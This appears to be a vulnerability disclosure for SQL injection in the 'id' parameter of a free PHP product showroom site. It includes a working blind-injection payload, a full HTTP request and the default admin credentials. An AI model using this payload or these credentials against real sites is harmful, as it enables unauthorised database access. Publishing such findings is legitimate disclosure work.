# Product Show Room Site v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15370/product-show-room-site-phpoop-free-source-code.html

Vulnerability File: /psrs/?p=products/view_product&id=

Vulnerability location: /psrs/?p=products/view_product&id=, id

Current database name: psrs_db ,length is 7

[+] Payload: GET /psrs/?p=products/view_product&id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /psrs/?p=products/view_product&id=1%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=7g6mvmuq5m1o1cvqrhprll4jr1
Connection: close
```

When length (database ()) = 6, Content-Length: 20014
![image](https://user-images.githubusercontent.com/53587159/171565007-938cd00b-1e61-4730-8bbc-e581ec9ce61c.png)

![image](https://user-images.githubusercontent.com/53587159/171565070-ddf381fc-beda-4e86-af10-1f94593cd1aa.png)

When length (database ()) = 7, Content-Length: 21494

![image](https://user-images.githubusercontent.com/53587159/171564971-3a7b2faa-7bbb-4868-90d4-ef2fd986033f.png)

![image](https://user-images.githubusercontent.com/53587159/171565038-c214365f-3795-44a5-8113-438cda76060e.png)
